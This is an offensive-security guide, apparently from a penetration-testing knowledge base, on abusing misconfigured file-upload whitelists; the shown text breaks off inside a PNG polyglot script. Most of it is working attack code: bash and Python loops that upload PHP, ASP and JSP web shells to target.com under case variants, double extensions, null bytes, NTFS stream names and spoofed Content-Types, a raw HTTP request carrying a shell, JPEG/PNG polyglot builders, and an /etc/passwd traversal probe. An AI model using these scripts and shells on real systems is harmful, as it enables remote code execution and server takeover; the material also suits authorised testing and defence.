---
title: Whitelist Misconfiguration Abuse
description: Exploit improperly implemented file upload whitelists to bypass extension, MIME type, and content validation controls, achieving code execution through case manipulation, double extensions, parser differentials, and polyglot payloads.
navigation:
  title: Whitelist Misconfiguration Abuse
---

## Attack Overview

::callout
Whitelist Misconfiguration Abuse targets file upload endpoints that restrict uploads to a set of "allowed" file types but implement the check incorrectly. Attackers exploit gaps in how the whitelist is constructed, how comparisons are performed, how parsers interpret filenames, and how the web server ultimately handles the uploaded file — resulting in execution of attacker-controlled code despite a whitelist being in place.
::

::card-group
  ::card
  ---
  title: Core Concept
  ---
  A whitelist defines allowed file types (extensions, MIME types, magic bytes). Misconfiguration occurs when the whitelist check can be bypassed through case manipulation, alternative extensions, parser differentials, truncation, double extensions, content-type spoofing, or logic flaws in the comparison routine itself.
  ::

  ::card
  ---
  title: Impact
  ---
  Remote Code Execution, Web Shell Deployment, Server-Side Template Injection, Cross-Site Scripting via uploaded HTML/SVG, XML External Entity Injection, Denial of Service, Data Exfiltration, Privilege Escalation through configuration file upload.
  ::

  ::card
  ---
  title: Why Whitelists Fail
  ---
  Incomplete extension lists, case-sensitive comparisons on case-insensitive filesystems, parsing the wrong part of the filename, ignoring multi-extension handling by the web server, trusting client-supplied Content-Type, failing to validate actual file content, or not considering how the serving infrastructure interprets the stored file.
  ::

  ::card
  ---
  title: Attack Surface
  ---
  Profile image uploaders, document import endpoints, avatar uploads, media libraries, plugin/theme installers, attachment features, API file endpoints, CSV/XML importers, backup restore functions, CMS content editors.
  ::
::

## Whitelist Implementation Patterns

::accordion
  :::accordion-item{label="Pattern 1 — Extension-Only Whitelist"}
  ```
  Server Logic:
  ──────────────────────────────────────────────────────
  allowed = [".jpg", ".jpeg", ".png", ".gif", ".pdf"]
  
  uploaded_ext = get_extension(filename)
  if uploaded_ext NOT IN allowed:
      REJECT
  else:
      SAVE file
  ──────────────────────────────────────────────────────
  
  Weakness: How is get_extension() implemented?
  - Does it check the LAST extension or the FIRST?
  - Is comparison case-sensitive or case-insensitive?
  - Does it handle double extensions?
  - Does it strip trailing dots/spaces?
  - Does it handle null bytes?
  ```
  :::

  :::accordion-item{label="Pattern 2 — MIME Type Whitelist"}
  ```
  Server Logic:
  ──────────────────────────────────────────────────────
  allowed_mime = ["image/jpeg", "image/png", "image/gif"]
  
  content_type = request.headers["Content-Type"]  
  # OR
  content_type = request.files["file"].content_type
  
  if content_type NOT IN allowed_mime:
      REJECT
  ──────────────────────────────────────────────────────
  
  Weakness: Content-Type header is CLIENT-CONTROLLED.
  The server trusts the client-sent MIME type without
  verifying actual file content.
  ```
  :::

  :::accordion-item{label="Pattern 3 — Magic Bytes Whitelist"}
  ```
  Server Logic:
  ──────────────────────────────────────────────────────
  magic_signatures = {
      b'\xFF\xD8\xFF': "JPEG",
      b'\x89PNG':      "PNG", 
      b'GIF89a':       "GIF",
      b'GIF87a':       "GIF",
      b'%PDF':         "PDF"
  }
  
  file_header = uploaded_file.read(8)
  if file_header[:N] NOT MATCHING any signature:
      REJECT
  ──────────────────────────────────────────────────────
  
  Weakness: Only checks first N bytes. Executable code
  can be appended AFTER valid magic bytes. Polyglot files
  satisfy both image and code requirements.
  ```
  :::

  :::accordion-item{label="Pattern 4 — Combined Whitelist (Extension + MIME + Magic)"}
  ```
  Server Logic:
  ──────────────────────────────────────────────────────
  1. Check extension against whitelist         ← Bypassable
  2. Check Content-Type against whitelist      ← Client-controlled
  3. Check magic bytes against signatures      ← Polyglot bypass
  4. Optionally: reprocess image via GD/ImageMagick
  ──────────────────────────────────────────────────────
  
  Weakness: Each layer can be individually bypassed.
  Even combined, parser differentials between the
  validation library and the serving web server
  create exploitable gaps.
  ```
  :::

  :::accordion-item{label="Pattern 5 — Regex-Based Whitelist"}
  ```
  Server Logic:
  ──────────────────────────────────────────────────────
  # Common regex patterns and their flaws
  
  /\.(jpg|jpeg|png|gif)$/        ← No case-insensitive flag
  /\.(jpg|jpeg|png|gif)$/i       ← Only checks end, allows shell.php.jpg
  /^.*\.(jpg|jpeg|png|gif)$/i    ← Greedy match, only last ext
  /\.(jpg|jpeg|png|gif)/i        ← No anchor, matches anywhere
  /\.(jpg|jpeg|png|gif)\s*$/i    ← Allows trailing whitespace
  ──────────────────────────────────────────────────────
  
  Weakness: Regex anchoring, greediness, flags, and
  multiline handling all create bypass opportunities.
  ```
  :::
::

## Reconnaissance & Whitelist Fingerprinting

### Determine What Is Whitelisted

::tabs
  :::tabs-item{label="Extension Probing"}
  ```bash
  #!/bin/bash
  # Probe which extensions are allowed by the whitelist
  
  TARGET="https://target.com/upload"
  COOKIE="session=YOUR_SESSION"
  
  # Comprehensive extension list
  EXTENSIONS=(
    # Images
    jpg jpeg png gif bmp ico svg svgz webp tiff tif avif
    # Documents
    pdf doc docx xls xlsx ppt pptx odt ods odp
    # Text
    txt csv json xml yaml yml md rst
    # Web
    html htm xhtml css js mjs
    # Archives
    zip tar gz bz2 7z rar
    # Code / Executable
    php php3 php4 php5 php7 phtml pht phar phps
    asp aspx ashx asmx axd
    jsp jspx jsw jsv
    py pyc pyw
    rb erb
    pl cgi
    sh bash
    exe dll bat cmd com msi
    # Config
    htaccess htpasswd env ini conf cfg
    # Media
    mp4 avi mov wmv flv mp3 wav
    # Misc
    shtml shtm stm
    inc module install
  )
  
  echo "[*] Probing ${#EXTENSIONS[@]} extensions against ${TARGET}"
  echo ""
  
  for ext in "${EXTENSIONS[@]}"; do
    # Create minimal test file
    echo "test_${ext}" > "/tmp/test.${ext}"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST "${TARGET}" \
      -F "file=@/tmp/test.${ext};filename=test.${ext}" \
      -H "Cookie: ${COOKIE}" 2>/dev/null)
    
    if [ "$response" = "200" ] || [ "$response" = "201" ]; then
      echo "[ALLOWED]  .${ext} -> HTTP ${response}"
    elif [ "$response" = "415" ] || [ "$response" = "422" ] || [ "$response" = "400" ]; then
      echo "[BLOCKED]  .${ext} -> HTTP ${response}"
    else
      echo "[UNKNOWN]  .${ext} -> HTTP ${response}"
    fi
    
    rm -f "/tmp/test.${ext}"
  done
  ```
  :::

  :::tabs-item{label="MIME Type Probing"}
  ```bash
  #!/bin/bash
  # Probe which Content-Types are accepted
  
  TARGET="https://target.com/upload"
  COOKIE="session=YOUR_SESSION"
  
  MIME_TYPES=(
    "image/jpeg"
    "image/png"
    "image/gif"
    "image/bmp"
    "image/svg+xml"
    "image/webp"
    "image/tiff"
    "image/x-icon"
    "application/pdf"
    "application/octet-stream"
    "application/x-httpd-php"
    "application/x-php"
    "text/php"
    "text/x-php"
    "text/html"
    "text/plain"
    "text/xml"
    "application/xml"
    "application/json"
    "application/javascript"
    "application/x-javascript"
    "text/javascript"
    "application/xhtml+xml"
    "multipart/form-data"
    "application/zip"
    "application/x-tar"
    "video/mp4"
    "audio/mpeg"
    "application/x-sh"
    "application/x-cgi"
    "application/java-archive"
    "application/x-jsp"
    ""
    "invalid/type"
    "xyz"
  )
  
  echo "[*] Probing ${#MIME_TYPES[@]} MIME types..."
  
  for mime in "${MIME_TYPES[@]}"; do
    label="${mime:-[EMPTY]}"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST "${TARGET}" \
      -F "file=@test.txt;filename=test.txt;type=${mime}" \
      -H "Cookie: ${COOKIE}" 2>/dev/null)
    
    if [ "$response" = "200" ] || [ "$response" = "201" ]; then
      echo "[ALLOWED]  ${label} -> HTTP ${response}"
    else
      echo "[BLOCKED]  ${label} -> HTTP ${response}"
    fi
  done
  ```
  :::

  :::tabs-item{label="Error Message Analysis"}
  ```bash
  # Extract whitelist details from error messages
  
  # Upload disallowed extension and capture error
  curl -s -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.php" \
    -H "Cookie: session=SESS" | tee /tmp/error_response.txt
  
  # Common error patterns that leak whitelist info
  grep -iE \
    "allowed|permitted|accepted|supported|valid|extension|type|format|must be|only|expected|whitelist" \
    /tmp/error_response.txt
  
  # Examples of informative errors:
  # "Only .jpg, .jpeg, .png, .gif files are allowed"
  # "Supported formats: JPEG, PNG, GIF, PDF"
  # "File type not permitted. Accepted: image/*"
  # "Invalid file extension. Must be one of: jpg, png, gif"
  # "Error: application/x-php is not an accepted content type"
  
  # Try different invalid types to enumerate full whitelist
  for ext in php exe bat sh py rb; do
    echo "=== Testing .${ext} ==="
    curl -s -X POST https://target.com/upload \
      -F "file=@test.txt;filename=test.${ext}" \
      -H "Cookie: session=SESS" | grep -iE "allowed|permitted|accepted|supported|extension|format"
    echo ""
  done
  ```
  :::

  :::tabs-item{label="Burp Suite Analysis"}
  ```yaml
  # Burp Intruder - Extension Whitelist Enumeration
  #
  # 1. Capture upload request
  # 2. Send to Intruder
  # 3. Mark extension position: filename="test.§EXT§"
  # 4. Payload: List of all extensions (100+)
  # 5. Grep Match: "success", "uploaded", "saved"
  # 6. Grep Extract: error messages
  # 7. Sort by response code and length
  #
  # Filter results:
  # - HTTP 200/201 = ALLOWED
  # - HTTP 400/415/422 = BLOCKED
  # - Different response length = different handling
  #
  # Burp Comparer:
  # - Compare allowed vs blocked responses
  # - Identify exact validation logic from differences
  ```
  :::
::

### Identify Server-Side Technology

::code-group
```bash [Web Server Detection]
# Determine web server for extension mapping knowledge
curl -s -D- https://target.com/ -o /dev/null | grep -iE "server:|x-powered-by:|x-aspnet|x-generator"

# Detailed fingerprinting
whatweb https://target.com 2>/dev/null | tr ',' '\n'

# Wappalyzer-style detection
httpx -u https://target.com -tech-detect -silent

# Check specific technology indicators
curl -s -D- https://target.com/ -o /dev/null | grep -i "server:"
curl -s https://target.com/ | grep -oiE "wp-content|drupal|joomla|laravel|django|express|rails|spring"

# Extension handling test
for ext in php asp aspx jsp py rb pl cgi; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/nonexistent.${ext}")
  echo ".${ext} -> HTTP ${code}"
done
# Different error pages per extension reveal server-side handlers
```

```bash [Apache Module Detection]
# Check which Apache modules handle which extensions
# Look at responses for extension-specific behavior

# .htaccess accessible?
curl -s -o /dev/null -w "%{http_code}" https://target.com/.htaccess

# mod_php extensions
for ext in php php3 php4 php5 php7 phtml pht phar; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/test.${ext}")
  echo ".${ext} -> HTTP ${code}"
done

# mod_cgi extensions
for ext in cgi pl py sh; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/test.${ext}")
  echo ".${ext} -> HTTP ${code}"
done

# Server config info leak
curl -s https://target.com/server-info 2>/dev/null | head -50
curl -s https://target.com/server-status 2>/dev/null | head -50
```

```bash [Nginx Configuration Hints]
# Nginx specific behaviors
# Check for location block patterns
curl -s -D- "https://target.com/uploads/test.php" -o /dev/null
curl -s -D- "https://target.com/uploads/test.php/anything" -o /dev/null
# If second returns 200 with PHP execution → PATH_INFO misconfiguration

# Check for try_files behavior
curl -s -D- "https://target.com/nonexistent.php" -o /dev/null
# 404 from nginx vs PHP reveals fastcgi_pass configuration

# Nginx alias traversal check
curl -s "https://target.com/uploads../etc/passwd"
```
::

## Extension Bypass Techniques

### Technique 1 — Case Manipulation

::note
Many whitelists perform case-sensitive comparison (`".jpg"`) while the web server and filesystem handle extensions case-insensitively. This is especially effective on Windows servers and Apache with default configuration.
::

::tabs
  :::tabs-item{label="Case Variation Payloads"}
  ```bash
  # Whitelist allows: .jpg, .jpeg, .png, .gif
  # Server executes: .PHP, .Php, .pHP (case-insensitive handler)
  
  # PHP case variations
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.pHp" \
    -H "Cookie: session=SESS"
  
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.PhP" \
    -H "Cookie: session=SESS"
  
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.PHP" \
    -H "Cookie: session=SESS"
  
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.pHP" \
    -H "Cookie: session=SESS"
  
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.phP" \
    -H "Cookie: session=SESS"
  ```
  :::

  :::tabs-item{label="Automated Case Fuzzing"}
  ```python
  #!/usr/bin/env python3
  """Generate all case permutations of an extension"""
  
  import itertools
  import requests
  import sys
  
  def case_permutations(ext):
      """Generate all case combinations"""
      if not ext:
          return ['']
      combos = []
      for combo in itertools.product(*[(c.lower(), c.upper()) for c in ext]):
          combos.append(''.join(combo))
      return list(set(combos))
  
  target = sys.argv[1]
  cookie = sys.argv[2]
  shell = '<?php echo "CASE_BYPASS"; system($_GET["cmd"]); ?>'
  
  extensions = ['php', 'phtml', 'pht', 'php5', 'phar']
  
  for ext in extensions:
      perms = case_permutations(ext)
      print(f"[*] Testing {len(perms)} case permutations for .{ext}")
      
      for perm in perms:
          filename = f"shell.{perm}"
          r = requests.post(
              f"{target}/upload",
              files={'file': (filename, shell, 'image/jpeg')},
              headers={'Cookie': cookie},
              verify=False
          )
          
          if r.status_code in [200, 201]:
              # Verify execution
              check = requests.get(
                  f"{target}/uploads/{filename}",
                  params={'cmd': 'id'},
                  headers={'Cookie': cookie},
                  verify=False
              )
              if 'CASE_BYPASS' in check.text:
                  print(f"[+] BYPASS: .{perm} -> RCE confirmed!")
                  print(f"[+] URL: {target}/uploads/{filename}")
                  sys.exit(0)
              else:
                  print(f"[~] Uploaded .{perm} but no execution")
          else:
              pass  # Blocked
  ```
  :::

  :::tabs-item{label="ASP.NET Case Variants"}
  ```bash
  # ASP.NET case variations
  for ext in \
    aspx Aspx ASPX aSPX aSpX \
    asp Asp ASP aSP \
    ashx Ashx ASHX \
    asmx Asmx ASMX \
    axd Axd AXD; do
    
    curl -s -o /dev/null -w ".${ext} -> HTTP %{http_code}\n" \
      -X POST https://target.com/upload \
      -F "file=@shell.aspx;filename=shell.${ext}" \
      -H "Cookie: session=SESS"
  done
  ```
  :::
::

### Technique 2 — Alternative Executable Extensions

::warning
Most whitelists block `.php` but many web servers execute code through alternative extensions that are not in the blocklist. Each server technology has multiple executable extensions.
::

::tabs
  :::tabs-item{label="PHP Alternative Extensions"}
  ```bash
  # PHP alternative extensions - often not in whitelist
  EXTENSIONS=(
    php    php2   php3   php4   php5   php6   php7   php8
    phtml  pht    phps   phar   pgif   shtml  
    inc    module install
    pHp    pHP    PhP    PHp    PHP
  )
  
  SHELL='<?php echo "EXT_BYPASS_".php_uname(); system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/shell_test
  
  for ext in "${EXTENSIONS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/shell_test;filename=test.${ext}" \
      -H "Cookie: session=SESS")
    
    if [ "$code" = "200" ] || [ "$code" = "201" ]; then
      # Check if it executes
      result=$(curl -s "https://target.com/uploads/test.${ext}?cmd=id" 2>/dev/null)
      if echo "$result" | grep -q "EXT_BYPASS"; then
        echo "[+] RCE via .${ext} -> Upload: HTTP ${code}"
      else
        echo "[~] Uploaded .${ext} but no execution"
      fi
    else
      echo "[-] Blocked .${ext} -> HTTP ${code}"
    fi
  done
  ```
  :::

  :::tabs-item{label="ASP/ASP.NET Alternatives"}
  ```bash
  # ASP.NET executable extensions
  EXTENSIONS=(
    asp aspx ashx asmx axd
    cshtml vbhtml
    aspq
    cshtm
    soap
    rem
    config
    svc
  )
  
  SHELL='<%@ Page Language="C#" %><% Response.Write("EXT_BYPASS"); %>'
  echo "$SHELL" > /tmp/shell_aspx
  
  for ext in "${EXTENSIONS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/shell_aspx;filename=test.${ext}" \
      -H "Cookie: session=SESS")
    echo ".${ext} -> HTTP ${code}"
  done
  ```
  :::

  :::tabs-item{label="Java Alternatives"}
  ```bash
  # Java/Tomcat executable extensions
  EXTENSIONS=(
    jsp jspx jspf jsw jsv
    xml
    war
  )
  
  SHELL='<% out.println("EXT_BYPASS_" + System.getProperty("os.name")); %>'
  echo "$SHELL" > /tmp/shell_jsp
  
  for ext in "${EXTENSIONS[@]}"; do
    curl -s -o /dev/null -w ".${ext} -> HTTP %{http_code}\n" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/shell_jsp;filename=test.${ext}" \
      -H "Cookie: session=SESS"
  done
  ```
  :::

  :::tabs-item{label="Other Server Technologies"}
  ```bash
  # Python WSGI/CGI
  for ext in py pyc pyw pyo wsgi; do
    curl -s -o /dev/null -w ".${ext} -> HTTP %{http_code}\n" \
      -X POST https://target.com/upload \
      -F "file=@shell.py;filename=test.${ext}" \
      -H "Cookie: session=SESS"
  done
  
  # Ruby
  for ext in rb erb rhtml; do
    curl -s -o /dev/null -w ".${ext} -> HTTP %{http_code}\n" \
      -X POST https://target.com/upload \
      -F "file=@shell.rb;filename=test.${ext}" \
      -H "Cookie: session=SESS"
  done
  
  # Perl
  for ext in pl cgi pm; do
    curl -s -o /dev/null -w ".${ext} -> HTTP %{http_code}\n" \
      -X POST https://target.com/upload \
      -F "file=@shell.pl;filename=test.${ext}" \
      -H "Cookie: session=SESS"
  done
  
  # Server-Side Includes
  for ext in shtml shtm stm; do
    curl -s -o /dev/null -w ".${ext} -> HTTP %{http_code}\n" \
      -X POST https://target.com/upload \
      -F "file=@ssi_payload.shtml;filename=test.${ext}" \
      -H "Cookie: session=SESS"
  done
  
  # ColdFusion
  for ext in cfm cfml cfc; do
    curl -s -o /dev/null -w ".${ext} -> HTTP %{http_code}\n" \
      -X POST https://target.com/upload \
      -F "file=@shell.cfm;filename=test.${ext}" \
      -H "Cookie: session=SESS"
  done
  ```
  :::
::

### Technique 3 — Double Extension / Multi-Extension Abuse

::callout
Apache's `mod_mime` processes extensions from right to left and uses the **first recognized extension**. If a file is named `shell.php.jpg`, Apache checks `.jpg` first. But if the file is `shell.php.xyz` and `.xyz` is unrecognized, Apache falls back to `.php` and executes it as PHP.
::

::tabs
  :::tabs-item{label="Apache Double Extension"}
  ```bash
  # Apache mod_mime right-to-left extension resolution
  # If rightmost extension is unknown, Apache uses the next one
  
  # Bypass: .php + unknown extension
  # Whitelist allows .jpg → add .jpg but include .php before it
  
  # Scenario: Whitelist checks LAST extension only
  PAYLOADS=(
    "shell.php.jpg"        # Last ext .jpg passes whitelist, server may still exec .php
    "shell.php.jpeg"       # Same with .jpeg
    "shell.php.png"        # Same with .png
    "shell.php.gif"        # Same with .gif
    "shell.php.pdf"        # Same with .pdf
  )
  
  SHELL='<?php echo "DOUBLE_EXT_BYPASS"; system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/dbl_shell
  
  for payload in "${PAYLOADS[@]}"; do
    curl -s -X POST https://target.com/upload \
      -F "file=@/tmp/dbl_shell;filename=${payload}" \
      -H "Cookie: session=SESS" -o /dev/null
    
    # Check execution
    result=$(curl -s "https://target.com/uploads/${payload}?cmd=id" 2>/dev/null)
    if echo "$result" | grep -q "DOUBLE_EXT_BYPASS"; then
      echo "[+] RCE: ${payload}"
    fi
  done
  ```
  :::

  :::tabs-item{label="Unknown Extension Fallback"}
  ```bash
  # Apache falls back to earlier extension if last is unknown
  # Register only known MIME types → unrecognized ext triggers fallback
  
  # .xxx is not a registered MIME type
  PAYLOADS=(
    "shell.php.xxx"
    "shell.php.abc"
    "shell.php.zzz"
    "shell.php.foobar"
    "shell.php.blah123"
    "shell.php.test"
    "shell.php.random"
    "shell.php.doesnotexist"
    "shell.php.aaa"
    "shell.phtml.qqq"
    "shell.pht.rrr"
    "shell.phar.sss"
  )
  
  SHELL='<?php echo "FALLBACK_BYPASS"; system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/fb_shell
  
  for payload in "${PAYLOADS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/fb_shell;filename=${payload}" \
      -H "Cookie: session=SESS")
    
    if [ "$code" = "200" ] || [ "$code" = "201" ]; then
      result=$(curl -s "https://target.com/uploads/${payload}?cmd=id")
      if echo "$result" | grep -q "FALLBACK_BYPASS"; then
        echo "[+] RCE via unknown ext fallback: ${payload}"
      else
        echo "[~] Uploaded: ${payload} (no exec)"
      fi
    fi
  done
  ```
  :::

  :::tabs-item{label="Reverse Double Extension"}
  ```bash
  # Whitelist checks FIRST extension
  # Server executes based on LAST extension
  
  PAYLOADS=(
    "shell.jpg.php"
    "shell.png.php"
    "shell.gif.php"
    "shell.pdf.phtml"
    "shell.jpeg.pht"
    "shell.jpg.php5"
    "shell.png.phar"
    "shell.gif.php7"
  )
  
  SHELL='<?php echo "REVERSE_DBL"; system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/rev_shell
  
  for payload in "${PAYLOADS[@]}"; do
    curl -s -o /dev/null -w "${payload} -> HTTP %{http_code}\n" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/rev_shell;filename=${payload}" \
      -H "Cookie: session=SESS"
  done
  ```
  :::

  :::tabs-item{label="Triple / Multiple Extensions"}
  ```bash
  # Multiple extension confusion
  PAYLOADS=(
    "shell.jpg.png.php"
    "shell.gif.jpg.phtml"
    "shell.pdf.png.php5"
    "shell.jpg.jpeg.png.gif.php"
    "shell.jpg.php.jpg.php"
    "image.php.jpg.php"
    "avatar.png.gif.php"
  )
  
  for payload in "${PAYLOADS[@]}"; do
    curl -s -o /dev/null -w "${payload} -> HTTP %{http_code}\n" \
      -X POST https://target.com/upload \
      -F "file=@/tmp/rev_shell;filename=${payload}" \
      -H "Cookie: session=SESS"
  done
  ```
  :::
::

### Technique 4 — Trailing Characters and Null Bytes

::code-group
```bash [Trailing Characters]
# Windows ignores trailing dots and spaces
# Some parsers strip these AFTER whitelist check

PAYLOADS=(
  # Trailing dot
  "shell.php."
  "shell.php.."
  "shell.php..."
  "shell.php.   "
  
  # Trailing space
  "shell.php "
  "shell.php  "
  "shell.php%20"
  
  # Trailing newline
  "shell.php%0a"
  "shell.php%0d"
  "shell.php%0d%0a"
  "shell.php%0a.jpg"
  
  # Trailing slash (might be stripped)
  "shell.php/"
  "shell.php/."
  
  # Windows NTFS
  "shell.php::$DATA"
  "shell.php::$DATA.jpg"
  "shell.php:$DATA"
  
  # Mixed
  "shell.php.%20"
  "shell.php.%00"
  "shell.php . . ."
)

for payload in "${PAYLOADS[@]}"; do
  curl -s -o /dev/null -w "%-40s -> HTTP %{http_code}\n" \
    -X POST https://target.com/upload \
    -F "file=@shell.php;filename=${payload}" \
    -H "Cookie: session=SESS"
done
```

```bash [Null Byte Injection]
# Null byte truncation (PHP < 5.3.4, older systems)
# Whitelist checks extension AFTER null byte
# Filesystem truncates AT null byte

PAYLOADS=(
  "shell.php%00.jpg"
  "shell.php%00.png"
  "shell.php%00.gif"
  "shell.php%00.pdf"
  "shell.phtml%00.jpg"
  "shell.pht%00.png"
  "shell.php5%00.gif"
  "shell.phar%00.jpg"
  
  # Double-encoded null
  "shell.php%2500.jpg"
  
  # URL-encoded
  "shell.php\x00.jpg"
  "shell.php\0.jpg"
)

for payload in "${PAYLOADS[@]}"; do
  curl -s -o /dev/null -w "%-40s -> HTTP %{http_code}\n" \
    -X POST https://target.com/upload \
    -F "file=@shell.php;filename=${payload}" \
    -H "Cookie: session=SESS"
done
```

```bash [Semicolon / Colon Injection]
# IIS semicolon parsing
# IIS treats ; as a parameter separator in URLs
# shell.asp;.jpg → IIS processes as .asp

PAYLOADS=(
  "shell.asp;.jpg"
  "shell.aspx;.jpg"
  "shell.asp;jpg"
  "shell.aspx;.png"
  "shell.asp;test.jpg"
  "shell.aspx;anything.gif"
  "shell.php;.jpg"
  
  # Colon (NTFS alternate data stream)
  "shell.asp:.jpg"
  "shell.aspx:.jpg"
  "shell.php:.jpg"
)

for payload in "${PAYLOADS[@]}"; do
  curl -s -o /dev/null -w "%-40s -> HTTP %{http_code}\n" \
    -X POST https://target.com/upload \
    -F "file=@shell.aspx;filename=${payload}" \
    -H "Cookie: session=SESS"
done
```
::

### Technique 5 — Content-Type / MIME Spoofing

::steps{level="4"}

#### Identify MIME-Based Whitelist

```bash
# Test if server validates Content-Type header
# Upload with wrong Content-Type
curl -s -X POST https://target.com/upload \
  -F "file=@shell.php;filename=shell.jpg;type=application/x-php" \
  -H "Cookie: session=SESS"
# If blocked → server checks Content-Type

curl -s -X POST https://target.com/upload \
  -F "file=@shell.php;filename=shell.jpg;type=image/jpeg" \
  -H "Cookie: session=SESS"
# If allowed → server trusts Content-Type header
```

#### Spoof Content-Type for Allowed MIME

```bash
# Upload PHP shell with image Content-Type
curl -X POST https://target.com/upload \
  -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
  -H "Cookie: session=SESS"

curl -X POST https://target.com/upload \
  -F "file=@shell.php;filename=shell.php;type=image/png" \
  -H "Cookie: session=SESS"

curl -X POST https://target.com/upload \
  -F "file=@shell.php;filename=shell.php;type=image/gif" \
  -H "Cookie: session=SESS"

curl -X POST https://target.com/upload \
  -F "file=@shell.php;filename=shell.php;type=application/pdf" \
  -H "Cookie: session=SESS"

curl -X POST https://target.com/upload \
  -F "file=@shell.php;filename=shell.php;type=application/octet-stream" \
  -H "Cookie: session=SESS"
```

#### Raw HTTP Request Manipulation

```http
POST /upload HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: multipart/form-data; boundary=----Bound

------Bound
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------Bound--
```

#### Verify Execution

```bash
curl "https://target.com/uploads/shell.php?cmd=id"
```

::

### Technique 6 — Extension Parsing Differential

::collapsible
**Exploiting differences between how the application parses extensions versus how the web server interprets them**

```bash
# Parser differential examples:

# 1. Application uses: pathinfo() → gets LAST extension
#    Apache mod_mime: uses FIRST RECOGNIZED extension
#    Payload: shell.php.jpg (app sees .jpg, Apache may exec .php)

# 2. Application uses: split('.')[1] → gets FIRST extension
#    Server uses: last extension
#    Payload: shell.jpg.php (app sees .jpg, server execs .php)

# 3. Application uses: endswith('.jpg')
#    But doesn't anchor the check
#    Payload: shell.php\n.jpg (newline tricks endswith)

# 4. Application uses: regex /\.jpg$/
#    But regex runs in MULTILINE mode
#    Payload: "shell.php\n.jpg" ($ matches before \n)

# 5. Application strips extension then re-adds
#    strip('.php') → 'shell' → 'shell.jpg'
#    But if filename is 'shell.pphph' → strip('.php') → 'shell.ph' 
#    No, think of it as: recursive stripping weakness

# 6. Framework-specific parsing
#    Express path.extname('shell.php.jpg') → '.jpg'
#    Python os.path.splitext('shell.php.jpg') → ('shell.php', '.jpg')
#    PHP pathinfo('shell.php.jpg')['extension'] → 'jpg'
#    Ruby File.extname('shell.php.jpg') → '.jpg'
#    Java FilenameUtils.getExtension('shell.php.jpg') → 'jpg'

# Test each differential:
for payload in \
  "shell.php.jpg" \
  "shell.jpg.php" \
  "shell.php%0a.jpg" \
  "shell.php%20.jpg" \
  "shell.php....jpg" \
  "shell.php/.jpg" \
  "shell.php\\.jpg"; do
  
  curl -s -o /dev/null -w "%-40s -> HTTP %{http_code}\n" \
    -X POST https://target.com/upload \
    -F "file=@shell.php;filename=${payload}" \
    -H "Cookie: session=SESS"
done
```
::

## Magic Bytes / Content Validation Bypass

### Polyglot File Crafting

::note
A polyglot file is valid as multiple file types simultaneously. By prepending valid image headers to PHP/ASP code, the file passes magic byte validation while remaining executable by the web server.
::

::tabs
  :::tabs-item{label="JPEG Polyglot"}
  ```bash
  # Method 1: JPEG header + PHP
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > polyglot.php.jpg
  echo '<?php echo "POLYGLOT_JPEG"; system($_GET["cmd"]); ?>' >> polyglot.php.jpg
  
  # Method 2: Minimal JPEG
  printf '\xFF\xD8\xFF\xE0' > polyglot.php.jpg
  echo '<?php echo "POLYGLOT_JPEG"; system($_GET["cmd"]); ?>' >> polyglot.php.jpg
  
  # Method 3: JPEG with EXIF containing PHP
  exiftool -Comment='<?php echo "EXIF_BYPASS"; system($_GET["cmd"]); ?>' legitimate.jpg -o polyglot_exif.php.jpg
  
  # Method 4: Using JPEG comment marker
  printf '\xFF\xD8\xFF\xFE' > polyglot.php.jpg
  printf '\x00\x50' >> polyglot.php.jpg  # Comment length
  echo '<?php echo "JPEG_COMMENT"; system($_GET["cmd"]); ?>' >> polyglot.php.jpg
  printf '\xFF\xD9' >> polyglot.php.jpg
  
  # Upload
  curl -X POST https://target.com/upload \
    -F "file=@polyglot.php.jpg;filename=polyglot.php.jpg;type=image/jpeg" \
    -H "Cookie: session=SESS"
  
  # Verify valid JPEG
  file polyglot.php.jpg
  identify polyglot.php.jpg 2>/dev/null && echo "Valid image"
  ```
  :::

  :::tabs-item{label="PNG Polyglot"}
  ```bash
  # PNG header + PHP
  # PNG signature: 89 50 4E 47 0D 0A 1A 0A
  printf '\x89PNG\r\n\x1a\n' > polyglot.php.png
  echo '<?php echo "POLYGLOT_PNG"; system($_GET["cmd"]); ?>' >> polyglot.php.png
  
  # Using tEXt chunk to embed PHP
  python3 << 'PYEOF'
  import struct
  import zlib
  
  def create_png_polyglot(output):
      png_sig = b'\x89PNG\r\n\x1a\n'
      
      # IHDR chunk (minimal valid)
      ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
      ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff
      ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)
      
      # tEXt chunk with PHP payload
      php_payload = b'<?php echo "PNG_TEXT_BYPASS"; system($_GET["cmd"]); ?>'
      text_data = b'Comment\x00' + php_payload
